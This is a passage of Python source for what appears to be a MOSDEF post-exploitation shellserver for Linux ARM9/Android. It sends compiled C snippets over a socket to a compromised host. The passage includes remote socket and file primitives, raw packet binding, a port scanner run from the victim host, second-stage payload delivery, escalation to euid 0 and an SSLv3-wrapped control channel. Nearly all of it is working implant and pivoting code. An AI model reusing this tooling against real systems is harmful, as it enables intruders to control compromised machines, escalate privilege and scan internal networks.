        vars["fd"] = fd
        self.clearfunctioncache()
        #devlog('linuxMosdefShellServer::accept()', "self.compile is %s" % self.compile)
        message = self.compile(code,vars)
        self.sendrequest(message)
        # C: signed int accept(), so we return sint32
        ret = self.readint(signed=True)
        devlog('linuxMosdefShellServer::accept()', "ret=%d" % ret)
        addr = self.readint()
        devlog('linuxMosdefShellServer::accept()', "addr=%d" % addr)
        self.leave()

        return ret

    def getsendcode(self,fd,buffer):
        """Reliable send to socket, returns a shellcode for use by Node and self"""

        devlog('shellserver::getsendcode', "(LINUX) Sending %d bytes to fd %d" % (len(buffer), fd))

        code="""
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"
        #import "string", "buffer" as "buffer"
        #import "local", "send" as "send"

        #import "local", "sendint" as "sendint"

        void main()
        {
           int i;
           char *p;
           int wanted;
           int success;

           success = 1; // optimist
           wanted = length;
           p = buffer;

           while (wanted > 0)
           {
               i = send(fd, p, wanted, 0); // flags set to zero here

               // 0-errno is returned from syscall on our Linux imp.
               if (i < 0)
               {
                   wanted = 0;
                   success = 0;
               }
               else
               {
                   wanted = wanted-i;
                   p = p + i;
               }
           }

           sendint(success);
        }
        """

        # XXX: check this with hasattr in MOSDEFNode
        # XXX: until everything is moved over
        self.special_shellserver_send = True

        vars = {}
        vars["fd"] = fd
        vars["length"] = len(buffer)
        vars["buffer"] = buffer
        self.clearfunctioncache()
        message = self.compile(code,vars)
        return message

    def write(self,fd,buffer):
        """
        Write to a buffer
        return 1 for success, 0 on error
        """
        code="""
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"
        #import "string", "buffer" as "buffer"
        #import "local", "write" as "write"
        #import "local", "sendint" as "sendint"

        void main()
        {
            int i;
            char *p;
            int wanted;
            int success;

            wanted = length;
            p = buffer;
            success = 1; // optimist

            while (wanted > 0 )
            {
                i = write(fd, p, wanted);
                if (i < 0)
                {
                    wanted = 0;
                    success = 0;
                }
                else
                {
                    wanted = wanted-i;
                    p = p+i;
                }
            }

            sendint(success);
        }
        """
        vars = {}
        vars["fd"] = fd
        vars["length"] = len(buffer)
        vars["buffer"] = buffer
        self.clearfunctioncache()
        message = self.compile(code,vars)
        self.sendrequest(message)
        ret = self.readint(signed=True)
        self.leave()
        return ret

    def read(self,fd,length):
        """
        read to a buffer from an fd
        return 1 for success, 0 on error
        """
        code="""
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"
        #import "local", "read" as "read"
        #import "local", "sendblock2self" as "sendblock2self"
        #import "local", "sendint" as "sendint"

        void main()
        {
            int i;
            char *p;
            char buffer[2000];

            p = buffer;

            i = read(fd, p, length);
            sendint(i);

            if (i > 0)
            {
                sendblock2self(buffer, i);
            }
        }
        """
        vars = {}
        vars["fd"] = fd
        if length > 2000:
            length = 2000
        vars["length"] = length
        self.clearfunctioncache()
        message = self.compile(code,vars)
        self.sendrequest(message)
        ret = self.readint(signed=True)
        buffer=""
        if ret > 0:
            buffer = self.readblock()
        self.leave()
        return ret,buffer

    def isactive(self,fd,timeout=0):
        """
        Checks to see if fd is readable
        """

        if timeout==None:
            timeout=0
        code="""
        #import "local","select" as "select"
        #import "local","FD_ZERO" as "FD_ZERO"
        #import "local","FD_SET" as "FD_SET"
        #import "int" , "readfd" as "readfd"
        #import "int" , "timeout" as "timeout"
        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"

        struct timeval {
          int tv_sec;
          int tv_usec;
        };

        void main() {
            int nfds;
            int read_fdset[32];
            struct timeval tv;
            int i;

            tv.tv_sec = timeout;
            tv.tv_usec = 0;

            nfds = readfd+1;
            FD_ZERO(read_fdset);
            FD_SET(readfd,read_fdset);
            i = select(nfds, read_fdset, 0, 0, &tv);
            if (i > 0)
            {
              sendint(1);
            }
            else
            {
              sendint(0);
            }
        }
        """
        vars={}
        vars["timeout"] = timeout
        vars["readfd"] = fd
        self.clearfunctioncache()
        message = self.compile(code,vars)
        self.sendrequest(message)
        ret = self.readint(signed=True)
        self.leave()
        return ret

    def readall(self,fd):
        """
        Read any and all data on the fd. Returns "" if none.
        """
        done=0
        retlist=[]
        while not done:
            ret=0
            if self.isactive(fd,timeout=5):
                ret,data=self.read(fd,1000)
                retlist+=[data]
            if not ret:
                done=1

        ret="".join(retlist)
        return ret

    def read_until(self,fd,prompt):
        """reads until we encounter a prompt"""
        print "read_until %d:%s called"%(fd,prompt)


        buf=""
        tmp="A"

        while tmp!="":
            tmp=self.read_some(fd)
            buf+=tmp
            if buf.find(prompt)!=-1:
                return buf
        #we did not find our string, and the socket closed or failed to respond!
        return ""

    def read_some(self,fd):
        """Read at least one byte of data"""
        buf=""
        tmp="A"
        #print "In read_some"
        if self.isactive(fd):
            ret,tmp=self.read(fd,1)
            if ret:
                buf+=tmp
        return buf

    # XXX: when bouncing ... MOSDEFNode calls the getsendcode
    # XXX: so for Linux shellservers you have to handle the
    # XXX: sendcode return value like you do from here :>

    def send(self, fd, buffer):
        """
        reliable send to socket
        """

        #print "XXX: fix me? def send LINUX called"
        message = self.getsendcode(fd, buffer)

        self.sendrequest(message)

        # XXX: we probably wanna do this for all the shellservers :>

        # sendcode now returns a value indicating failure (0), success (1)
        ret = self.readint()

        # done with the node end of things .. release thread
        self.leave()

        if not ret:
            raise Exception, '[!] send failed ... handle me! (re-raise to socket.error in MOSDEFSock)'

        return len(buffer) # as per send(2) specs

    def socket(self,proto):
        """
        calls socket and returns a file descriptor or -1 on failure.
        """
        code="""
        #import "int", "family" as "family"
        #import "int", "proto" as "proto"
        #import "int", "raw_proto" as "raw_proto"
        #include "socket.h"
        #import "local", "socket" as "socket"
        #import "local", "sendint" as "sendint"

        void main()
        {
           int i;
           i=socket(family,proto,raw_proto);
           sendint(i);
        }
        """
        family=self.libc.getdefine("AF_INET")
        raw_proto=0
        if proto.lower()=="tcp":
            proto=self.libc.getdefine('SOCK_STREAM')
        elif proto.lower()=="udp":
            proto=self.libc.getdefine('SOCK_DGRAM')
        elif proto.lower()=="raw":
            proto=self.libc.getdefine('SOCK_RAW')
            family=self.libc.getdefine('AF_PACKET')
            raw_proto=0x800 #self.libc.getdefine('ETH_P_IP')
        else:
            print "Don't know anything about protocol %s in socket()"%proto
            return -1

        vars = {}
        vars ["family"] = family
        vars ["proto"]= proto
        vars ["raw_proto"] = raw_proto

        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        ret = self.readint(signed=True)
        self.leave()

        return ret

    def connect(self,fd,host,port,proto,timeout):
        if proto.lower()=="tcp":
            proto=self.libc.getdefine('SOCK_STREAM')
        elif proto.lower()=="udp":
            proto=self.libc.getdefine('SOCK_DGRAM')
        else:
            print "Protocol not recognized"
            return -1
        return self.connect_sock(fd,host,port,proto,timeout)

    def connect_sock(self,fd,host,port,proto,timeout):
        """
        Does a tcp connect with a timeout
        """
        code="""
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "SOL_SOCKET" as "SOL_SOCKET"
        #import "int", "SO_ERROR" as "SO_ERROR"
        #import "int", "ip" as "ip"
        #import "int", "port" as "port"
        #import "int", "proto" as "proto"
        #import "int", "sockfd" as "sockfd"
        #import "int", "timeout" as "timeout"
        #include "socket.h"
        #import "local", "connect" as "connect"
        #import "local", "close" as "close"
        #import "local", "socket" as "socket"
        #import "local", "sendint" as "sendint"
        #import "local", "htons" as "htons"
        #import "local", "htonl" as "htonl"
        #import "local", "select" as "select"
        #import "local", "memset" as "memset"
        //#import "local", "debug" as "debug"
        #import "int", "F_SETFL" as "F_SETFL"
        #import "int", "F_GETFL" as "F_GETFL"
        #import "local", "fcntl" as "fcntl"
        #import "int", "O_NONBLOCK" as "O_NONBLOCK"
        #import "int", "O_BLOCK" as "O_BLOCK"
        #import "local", "getsockopt" as "getsockopt"

        struct timeval {
                int tv_sec;
                int tv_usec;
        };

        void main()
        {
          int mask[32];
          int tmpmask;
          int i;
          int ret;
          int ilen;
          int div;
          int n;
          int sockopt;
          int fdindex;
          int opts;
          struct timeval tv;
          struct sockaddr_in serv_addr;
          serv_addr.family=AF_INET; //af_inet

          //sockfd is set on MOSDEFSock init
          //sockfd=socket(AF_INET,SOCK_STREAM,0);

          //debug();
          serv_addr.addr=htonl(ip);
          serv_addr.port=htons(port);

          tv.tv_usec= 0;
          tv.tv_sec = timeout;

          memset(&mask, 0, 128);
          // we don't have a modulus so doing it like this
          fdindex = 0;
          if (sockfd > 31) {
              fdindex = sockfd;
              while (fdindex > 31) {
                  fdindex = fdindex - 32;
              }
          }
          else {
              fdindex = sockfd;
          }
          i = 0;
          div = sockfd;
          // we didnt do '/' yet when i wrote this
          while (div > 31)
          {
              i = i+1;
              div = div - 32;
          }
          //debug();
          mask[i] = 1<<fdindex;

          // set to non-blocking
          opts=fcntl(sockfd, F_GETFL, 0);
          opts=opts | O_NONBLOCK;
          fcntl(sockfd, F_SETFL, opts);

          ret = connect(sockfd,&serv_addr,16);
          // a bit botched, would be cleaner with errno
          //debug();
          // handle EINPROGRESS errno ony
          // we get away with this because our 'libc' is direct syscalls ;)
          // so errno is still in eax
          if (ret < 0) {
              if (ret == -115) {
                  n = sockfd + 1;
                  //debug();
                  i=select(n, 0, &mask, 0, &tv);
                  if (i > 0) {
                       sockopt = 0;
                       // assuming x86 linux
                       ilen = 4;
                       getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &sockopt, &ilen);
                       if (sockopt) {
                           // error occurred on socket
                           sendint(-1);
                           return;
                       }
                  }
                  // timeout or error
                  else {
                       sendint(-2);
                       return;
                  }
              }
              // some other errno was set
              else {
                  sendint(-1);
                  return;
              }
          }

          // connect (with timeout) succeeded

          // set back to blocking
          opts=fcntl(sockfd, F_GETFL, 0);
          opts=opts & O_BLOCK;
          fcntl(sockfd, F_SETFL, opts);
          sendint(0);
        }
        """

        hostlong=socket.gethostbyname(host) #resolve from remotehost
        hostlong=str2bigendian(socket.inet_aton(hostlong))

        vars = self.libc.getdefines()
        vars["ip"]=hostlong
        vars["port"]=port
        vars["proto"]=proto
        vars["sockfd"]=fd
        vars["timeout"]=timeout

        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        ret=self.readint(signed=True)
        self.leave()

        return ret

    def bindraw(self, interface='eth0', protocol=0x01):
        """ binds and returns a raw linklayer level socket
            returns -1 on failure
        """

        code="""
        #include <sys/socket.h>
        #include <net/if.h>

        #import "local", "socket" as "socket"
        #import "local", "ioctl" as "ioctl"
        #import "local", "bind" as "bind"
        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"
        #import "local", "strcpy" as "strcpy"
        #import "local", "memset" as "memset"

        #import "int", "SOCK_RAW" as "SOCK_RAW"
        #import "int", "AF_PACKET" as "AF_PACKET"
        #import "int", "PROTOCOL" as "PROTOCOL"
        #import "int", "SIOCGIFINDEX" as "SIOCGIFINDEX"

        #import "string", "INTERFACE" as "INTERFACE"

        void
        main()
        {
            // XXX: needs full ifreq struct in C_headers still .. but will do for now
            struct ifreq ifr;
            struct sockaddr_ll sock;

            int s;
            int ret;

            // def socket() can replace this call but whatev ..
            s = socket(AF_PACKET, SOCK_RAW, PROTOCOL);

            if (s == -1) {
                sendint(-1);
                return;
            }

            memset(&ifr, 0, 36);
            // XXX: adjust size as struct changes (C_headers.py)
            // overflow if input from remote .. plz not input from remote lol kthx
            strcpy(ifr.ifr_name, INTERFACE);

            // get the interface index for interface
            ret = ioctl(s, SIOCGIFINDEX, &ifr);
            if (ret < 0)
            {
                sendint(-1);
                return;
            }

            // fill the link layer address struct
            sock.sll_family = AF_PACKET;
            sock.sll_protocol = PROTOCOL;
            sock.sll_ifindex = ifr.ifr_index;
            sock.sll_pkttype = 0; // PACKET_HOST

            // zero out address muck
            sock.sll_halen = 0;
            memset(sock.sll_addr, 0, 8);

            // XXX: check with strace
            ret = bind(s, &sock, 20);
            if (ret < 0)
            {
                sendint(-1);
            }
            else
            {
                sendint(s);
            }
        }

        """

        vars = self.libc.getdefines()

        vars['PROTOCOL'] = socket.htons(protocol)
        # make sure to nul term strings for internal strcpy :>
        vars['INTERFACE'] = interface + '\x00'

        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        self.leave()

        return ret

    def setmntent(self, filename="/proc/mounts", type="r"):
        mode = 0

        if len(type) != 0:
            if type[0] == 'r':
                mode = self.libc.getdefine('O_RDONLY')
            elif type[0] == 'w':
                mode = self.libc.getdefine('O_WRONLY') | self.libc.getdefine('O_CREAT') | self.libc.getdefine('O_TRUNC')
            elif type[0] == 'a':
                mode = self.libc.getdefine('O_WRONLY') | self.libc.getdefine('O_CREAT') | self.libc.getdefine('O_APPEND')
            else:
                raise MSSError(errno.EINVAL, "setmntent", os.strerror(errno.EINVAL))

            if len(type) > 1:
                if type[1] == '+' or (type[0] == 'b' and type[1] == '+'):
                    mode = self.libc.getdefine('O_RDWR')

        ret = self.open(filename, mode, 0666)
        if ret < 0:
            raise MSSError(-ret, "setmntent", os.strerror(-ret))

        return ret

    def getmntent(self, fd):
        # Can raise MSSError exception
        line = self.file_readline(fd)

        # On EOF we get an empty line; propagate EOFError
        if line == "":
            raise EOFError

        # Add the record to the dictionary
        entry = line.split(None)
        mount = {}
        mount["mnt_fsname"] = entry[0].decode('string_escape')
        mount["mnt_dir"] = entry[1].decode('string_escape')
        mount["mnt_type"] = entry[2]
        mount["mnt_opts"] = entry[3]
        mount["mnt_freq"] = entry[4]
        mount["mnt_passno"] = entry[5]

        return mount

    # XXX: deal with EINTR
    def endmntent(self, fd):
        self.close(fd)

    #### non-libc like things. Advanced modules. Etc. ####

    def file_readline(self, fd):
        """
        Reads a line over the network.  This is different from a string, as
        the length of a line does not need to be known a priori, and is chopped
        into blocks on the fly.  The end of the line is denoted by a length
        field of 0, and the following integer will be an error code.
        In case of an error, the error code will be less than 0, and the
        string is not guaranteed to be a full string.
        """

        vars = { 'fd' : fd, 'sd' : '%d' % self.node.shell.fd }

        code="""
        #import "local","file_send_line" as "file_send_line"
        #import "int","sd" as "sd"
        #import "int","fd" as "fd"

        void main()
        {
                file_send_line(sd, fd);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)

        string = ""

        while True:
            # Read the length over the network.
            wanted = self.readint()

            # A length of 0 signals we have a line.
            # Note that in case of read errors, the line can be short,
            # and the error value should be caught to determine this.
            if wanted == 0:
                break

            # Receive this line block in a temporary string and append it.
            tmp = self.node.parentnode.recv(self.connection, wanted)
            string += tmp

        # In case of errors, throw an exception.
        error = self.readint(signed=True)
        if error < 0:
            self.leave()
            raise MSSError(-error, "file_readline", os.strerror(-error))

        # Success, return the result.
        self.leave()

        return string

    def getListenSock(self,addr,port):
        """
        Creates a tcp listener socket fd on a port
        """
        vars={}
        code="""
        #import "local", "bind" as "bind"
        #import "local", "listen" as "listen"
        #import "local", "socket" as "socket"
        #import "local", "setsockopt" as "setsockopt"
        #import "local", "close" as "close"
        #import "local", "sendint" as "sendint"
        #import "local", "htons" as "htons"
        #import "local", "htonl" as "htonl"
        #import "int", "addr" as "addr"
        //#import "local", "debug" as "debug"
        #import "int", "port" as "port"
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "SOCK_STREAM" as "SOCK_STREAM"
        #import "int", "SOL_SOCKET" as "SOL_SOCKET"
        #import "int", "SO_REUSEADDR" as "SO_REUSEADDR"
        #include "socket.h"

        void main()
        {
            int sockfd;
            int i;
            struct sockaddr_in serv_addr;

            serv_addr.family=AF_INET; //af_inet

            serv_addr.port=htons(port);
            serv_addr.addr=addr;
            sockfd = socket(AF_INET,SOCK_STREAM,0);

            // XXX: because we leave errno in eax negative .. always check < 0, not == -1

            if (sockfd < 0) {
                sockfd = -3; // failed to create the socket
            } else {
                i = 1;
                setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &i, 4); // XXX optval?
                i = bind(sockfd,&serv_addr,16);
                if (i < 0) {
                    close(sockfd);
                    sockfd = -1; // failed to bind
                } else {
                    i = listen(sockfd,16);
                    if (i < 0) {
                        close(sockfd);
                        sockfd = -2; // filed to listen
                    }
                }
            }
            sendint(sockfd); //success
        }
        """
        vars = self.libc.getdefines()
        vars["port"]=port
        # XXX for now str2littleendian -> self.libc.endianorder
        vars["addr"]=self.libc.endianorder(socket.inet_aton(addr))
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        fd=self.readint(signed=True)
        self.leave()

        return fd

    def tcpConnectScan(self,network,startport=1,endport=1024):
        """
        Connectscan from the remote host!
        """

        openports = []
        if network.count("/"):
            network,netmask=network.split("/")
        else:
            netmask=32
        netmask=int(netmask)

        hostlong=socket.gethostbyname(network) #resolve from remotehost
        hostlong=str2bigendian(socket.inet_aton(hostlong))
        numberofips=2**(32-netmask) #how many ip's total
        startip=hostlong&(~(numberofips-1)) #need to mask it out so we don't do wacky things

        vars = self.libc.getdefines()
        vars["startip"]=startip
        vars["numberofips"]=numberofips
        vars["startport"]=startport
        vars["endport"]=endport
        code="""
        #import "local", "connect" as "connect"
        #import "local", "close" as "close"
        #import "local", "socket" as "socket"
        #import "local", "sendint" as "sendint"
        #import "local", "htons" as "htons"
        #import "local", "htonl" as "htonl"
        #import "local", "debug" as "debug"
        #import "int", "startip" as "startip"
        #import "int", "startport" as "startport"
        #import "int", "endport" as "endport"
        #import "int", "numberofips" as "numberofips"
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "SOCK_STREAM" as "SOCK_STREAM"
        #include "socket.h"

        void main()
        {
          int currentport;
          int sockfd;
          int fd;
          int doneips;
          int currentip;

          struct sockaddr_in serv_addr;

          serv_addr.family=AF_INET; //af_inet
          currentip=startip;
          doneips=0;

          while (doneips<numberofips)
          {
               //FOR EACH IP...
               doneips=doneips+1;
               serv_addr.addr=htonl(currentip);
               currentport=startport;
               while (currentport<endport) {
                 //FOR EACH PORT
                 //debug();
                 sockfd=socket(AF_INET,SOCK_STREAM,0);
                 //debug();
                 serv_addr.port=htons(currentport);
                 if (connect(sockfd,&serv_addr,16)==0) {
                   //sendint(23);
                   sendint(currentport);
                 }
                 //debug();
                 //sendint(22);
                 close(sockfd);
                 //sendint(20);
                 currentport=currentport+1;
                 //sendint(21);
                }
               currentip=currentip+1;
          }
         sendint(0xffffffff);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        port = 0
        while port!=-1:
            port=self.readint()
            if port!=-1:
                openports.append(port)
        self.leave()
        return openports

    def tcpportscan(self,args):
        """
        TCP Connect scan from the remote host.
        Args: network to scan, startport, endport
        """
        argsL = args.split(" ")
        return self.tcpConnectScan(argsL[0],int(argsL[1]),int(argsL[2]))

#### END OF GLOBAL FUNCTION DEFINES ####

from MOSDEF.linuxremoteresolver import arm9linuxremoteresolver
class Linux_ARM9(LinuxShellServer, arm9linuxremoteresolver):
    def __init__(self, connection, node, logfunction=None, proctype='ARM9'):
        arm9linuxremoteresolver.__init__(self)
        unixshellserver.__init__(self, connection, type="Active", logfunction=logfunction)
        LinuxShellServer.__init__(self)
        MSSgeneric.__init__(self, 'ARM9')

        self.node         = node
        self.node.shell   = self
        self.started      = 0

        # Following maybe unused
        self.libraryDict  = {}
        self.functionDict = {}
        self.order        = intel_order
        self.unorder      = istr2int
        self.perror       = linux_perror
        self.shell        = "/system/bin/sh"

    def shellshock(self, logfile=None, shell=''):
        if not shell:
            shell = self.shell
        return LinuxShellServer.shellshock(self, logfile, shell)

    def popen2(self, command, shell=''):
        if not shell:
            shell = self.shell
        return LinuxShellServer.popen2(self, command, shell)

    def sh_tty_child(self, master, slavedev, shell=''):
        if not shell:
            shell = self.shell
        return LinuxShellServer.sh_tty_child(self, master, slavedev, shell)

    def fstat(self, fd):
        return self.__xstat(fd, mode="fstat")

    def stat(self, filename):
        return self.__xstat(filename, mode="stat")

    def __xstat(self, arg, mode="fstat"):
        """
        runs [f]stat
        """

        vars = {}
        if mode == "fstat":
            d = ("fstat", "int", "fd")
        elif mode == "stat":
            d = ("stat", "string", "filename")
        else:
            raise AssertionError, "mode is %s" % mode

        vars[d[2]] = arg

        code = """
        #include <sys/stat.h>
        #import "local","sendint" as "sendint"
        #import "local","sendshort" as "sendshort"
        #import "local","%s" as "%s"
        #import "%s", "%s" as "%s"

        void main()
        {
             struct stat buf;
             int ret;

             ret = %s(%s, &buf);
             sendint(ret);

             if (ret==0) {
                 //success
                 sendint(buf.st_dev);
                 sendint(buf.st_ino);
                 sendshort(buf.st_mode);
                 sendshort(buf.st_nlink);
                 sendshort(buf.st_uid);
                 sendshort(buf.st_gid);
                 sendint(buf.st_rdev);
                 sendint(buf.st_size);
                 sendint(buf.st_blksize);
                 sendint(buf.st_blocks);
                 sendint(buf.st_atime);
                 sendint(buf.st_mtime);
                 sendint(buf.st_ctime);
              }
        }
        """ % (d[0], d[0], d[1], d[2], d[2], d[0], d[2])

        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        statbuf = None
        if ret == 0:
            statbuf=self.readstruct([("l", "st_dev"),
                                     ("l", "st_ino"),
                                     ("s", "st_mode"),
                                     ("s", "st_nlink"),
                                     ("s", "st_uid"),
                                     ("s", "st_gid"),
                                     ("l", "st_rdev"),
                                     ("l", "st_size"),
                                     ("l", "st_blksize"),
                                     ("l", "st_blocks"),
                                     ("l", "st_atime"),
                                     ("l", "st_mtime"),
                                     ("l", "st_ctime")])
        self.leave()
        return ret, statbuf

    # signal is deprecated and not implemented in Android
    # We do it like GLIBC, and call sigaction
    def signal(self, signum, action):
        """
        Calls sigaction.
        """

        vars = {
            'signum' : signum,
            'action' : action,
        }

        self.clearfunctioncache()

        request = self.compile("""
        #import "local", "sendint" as "sendint"
        #import "local", "sigaction" as "sigaction"

        #import "int", "signum" as "signum"
        #import "int", "action" as "action"

        struct sigaction {
           int action;
           int flags;
           int mask;
        };

        void main()
        {
            struct sigaction st;
            int i;

            st.action = action;
            st.flags  = 0;
            st.mask   = 0;

            i = sigaction(signum, &st, 0);
            sendint(i);
        }
        """, vars)

        self.sendrequest(request)
        ret = self.readint()
        self.leave()
        return ret


    def clearfunctioncache(self):
        self.remoteFunctionsUsed = {}
        arm9linuxremoteresolver.clearfunctioncache(self)

    def readpointer(self):
        return self.readint()

    def startup(self):
        import MOSDEF.mosdef as mosdef

        self.log('Linux MOSDEF ARM9 Shellserver starting up..')
        if self.started: return 0

        self.log('Continuing..')

        if hasattr(self.connection, "set_timeout"):
            self.connection.set_timeout(None)
        else:
            self.log("Not using timeoutsocket on this node")

        # Stage 1 emulation, 4 byte length + 1 byte 'data' that won't be executed
        self.connection.send('\x01\x00\x00\x00\x00')
        self.fd = struct.unpack('<L', self.connection.recv(4))[0]
        self.known_fd = self.fd

        self.log("FD = %d" % self.fd)
        self.set_fd(self.fd)

        self.libc.initStaticFunctions({'fd': self.fd})
        self.localfunctions = copy.deepcopy(self.libc.localfunctions)
        self.initLocalFunctions()

        self.log("Set up Linux dynamic linking assembly component server")
        self.log("Initialized Local Functions.")

        from shellcode.standalone.linux.arm.payloads import payloads as arm_payloads
        p = arm_payloads()

        code = p.secondstage_with_fd(self.fd)
        self.sendrequest(p.assemble(code))
        self.leave()

        # Try and upgrade to SSL
        if not isinstance(self.connection, MOSDEFSock) and CanvasConfig['ssl_mosdef'] and self.do_ssl():
            old_connection = self.connection
            self.connection = ssl.wrap_socket(self.connection._sock, server_side=True,
                                              certfile=os.path.join(RESOURCE, 'mosdefcert.pem'),
                                              do_handshake_on_connect=False,
                                              ssl_version=ssl.PROTOCOL_SSLv3)
            try:
                self.log('SSL handshake..')
                self.connection.settimeout(20)
                self.connection.do_handshake()
                self.log('Encrypted loop established')

                # Replace write with SSL-enabled write
                self.localfunctions["write"] = ("c", """
                #import "remote", "SSL_write" as "SSL_write"
                #import "local",  "syscall3" as "syscall3"

                int write(int fd, char *buf, int nbytes)
                {

                    int retval;

                    if (fd == FD) {
                        retval = SSL_write(SSLPTR, buf, nbytes);
                    } else {
                        retval = syscall3(SYS_write, fd, buf, nbytes);
                    }

                    return retval;
                }
                """.replace("FD", str(self.fd)).replace("SSLPTR", str(self.ssl_ptr)))

                # Replace read with SSL-enabled read
                self.localfunctions["read"] = ("c", """
                #import "remote", "SSL_read" as "SSL_read"
                #import "local", "syscall3" as "syscall3"

                int read(int fd, char *buf, int nbytes)
                {
                    int retval;

                    if (fd == FD) {
                        retval = SSL_read(SSLPTR, buf, nbytes);
                    } else {
                        retval = syscall3(SYS_read, fd, buf, nbytes);
                    }

                    return retval;
                }
                """.replace("FD", str(self.fd)).replace("SSLPTR", str(self.ssl_ptr)))

                # Monkey patch the new SSL connection instance to add set_timeout method
                # that will simply call the python socket timeout method
                self.connection.set_timeout = types.MethodType(lambda s, t: s.settimeout(t), self.connection)

            except ssl.SSLError, ex:
                self.log(str(ex))
                self.log('Handshake failed, aborting crypto setup')
                self.log('Attempt to synchronize connection..')
                self.connection = old_connection

                buf   = []

                while True:
                    byte = self.connection.recv(1)

                    if not byte:
                        # Connection closed
                        self.log('Connection closed, aborting ShellServer startup')
                        return 0

                    buf.append(byte)

                    if ''.join(buf[-4:]) == '\xdd\xcc\xbb\xaa':
                        # We have our trigger
                        self.log('Re-synchronized connection, continuing with normal MOSDEF')
                        # Send trigger to remote end
                        self.connection.sendall('\xdd\xcc\xbb\xaa')
                        break



        self.log("Resetting signal handlers...")

        SIGCHLD = self.libc.getdefine('SIGCHLD')
        SIG_DFL = self.libc.getdefine('SIG_DFL')
        SIGPIPE = self.libc.getdefine('SIGPIPE')
        SIG_IGN = self.libc.getdefine('SIG_IGN')

        self.log("Reset SIGCHLD")
        self.signal(SIGCHLD, SIG_DFL)

        self.log("Ignoring SIGPIPE")
        self.signal(SIGPIPE, SIG_IGN)

        self.log("Getting UIDs");
        (uid,euid,gid,egid) = self.ids()
        self.log("UID: %d EUID: %d GID: %d EGID: %d" % (uid, euid, gid, egid))

        self.uid = uid # so we get a nice little '#' prompt from NodePrompt on uid 0

        if euid != 0 and uid == 0:
            self.log("Setting euid to 0...")
            self.seteuid(0)

        self.log('PID: %d' % self.getpid())
        self.log('Uname: %s' % self.uname())

        res, st = self.stat("/bin/sh")
        if not res:
            self.shell = "/bin/sh"

        self.setInfo("Linux MOSDEF ARM9 ShellServer. Remote host: %s" % ("*" + str(self.getRemoteHost()) + "*"))
        self.setProgress(100)
        self.started = 1
        self.log('Linux MOSDEF ARM9 ShellServer Startup: DONE')

        return 1

    def do_ssl(self, timeout=10):
        """
        Try and upgrade the existing TCP MOSDEF connection to an encrypted SSL.

        There is some trickery involved here, mainly to do with the fact that
        SSL_connect can block for ever (even on errors), so we need to do everything
        in non-blocking mode, measure elapsed time and bail out if it gets to be
        too long.

        TIMEOUT is maximum time in seconds that we will spend in the SSL handshake.
        """

        vars = self.libc.getdefines()

        vars['FD']      = self.fd
        vars['TIMEOUT'] = timeout

        code = """
        #import "remote", "SSL_library_init"       as "SSL_library_init"
        #import "remote", "SSL_CTX_new"            as "SSL_CTX_new"
        #import "remote", "SSLv3_method"           as "SSLv3_method"
        #import "remote", "SSL_new"                as "SSL_new"
        #import "remote", "SSL_set_fd"             as "SSL_set_fd"
        #import "remote", "SSL_connect"            as "SSL_connect"
        #import "remote", "SSL_read"               as "SSL_read"
        #import "remote", "SSL_write"              as "SSL_write"
        #import "remote", "SSL_get_error"          as "SSL_get_error"

        #import "local",  "select"                 as "select"

        #import "local",  "read"        as "read"
        #import "local",  "fcntl"       as "fcntl"
        #import "local",  "sendint"     as "sendint"
        #import "local",  "sendpointer" as "sendpointer"
        #import "local",  "munmap"      as "munmap"
        #import "local",  "mmap"        as "mmap"
        #import "local",  "exit"        as "exit"
        #import "local",  "callptr"     as "callptr"
        #import "local",  "clearcache"  as "clearcache"
        #import "local",  "debug"       as "debug"

        #import "int",    "FD"          as "FD"
        #import "int",    "F_SETFL"     as "F_SETFL"
        #import "int",    "F_GETFL"     as "F_GETFL"
        #import "int",    "O_NONBLOCK"  as "O_NONBLOCK"
        #import "int",    "O_BLOCK"     as "O_BLOCK"

        #import "int",    "PROT_READ"   as "PROT_READ"
        #import "int",    "PROT_WRITE"  as "PROT_WRITE"
        #import "int",    "PROT_EXEC"   as "PROT_EXEC"
        #import "int",    "MAP_PRIVATE" as "MAP_PRIVATE"
        #import "int",    "MAP_ANONYMOUS"    as "MAP_ANONYMOUS"
        #import "int",    "MAP_FAILED"  as "MAP_FAILED"

        struct timeval {
            int sec;
            int usec;
        };

        void main()
        {
            char *m;
            void *ctx;
            void *ssl;
            void *method;
            char *p;

            int ret;
            int len;
            int left;

            int timeout;
            int connected;
            int opts;

            struct timeval tv;


            SSL_library_init();
            method = SSLv3_method();

            ctx = SSL_CTX_new(method);
            ssl = SSL_new(ctx);

            sendpointer(ssl);
            SSL_set_fd(ssl, FD);

            // Turn on non-blocking mode since SSL_connect can block forever
            opts = fcntl(FD, F_GETFL, 0);
            opts = opts | O_NONBLOCK;
            fcntl(FD, F_SETFL, opts);

            timeout   = 0;
            connected = 0;

            do {
                tv.sec  = 1;
                tv.usec = 0;

                ret = SSL_connect(ssl);

                if (ret == 1) {
                    connected = 1;
                } else {
                    ret = select(NULL, NULL, NULL, NULL, &tv);
                    timeout = timeout + 1;

                    if (ret == -1) {
                        connected = 2;
                    }

                    if (timeout == TIMEOUT) {
                        connected = 2;
                    }
                }
            } while (connected == 0);


            // Turn off non-blocking mode
            opts = fcntl(FD, F_GETFL, 0);
            opts = opts & O_BLOCK;
            fcntl(FD, F_SETFL, opts);

            if (connected != 1) {
                // Handshake error, need to resynchronize
                // if we want to keep connection/mosdef loop going
                sendint(2864434397);

                do {
                    p = &connected;
                    left = 4;
                    do {
                        ret = read(FD, p, left);

                        if (ret < 0) {
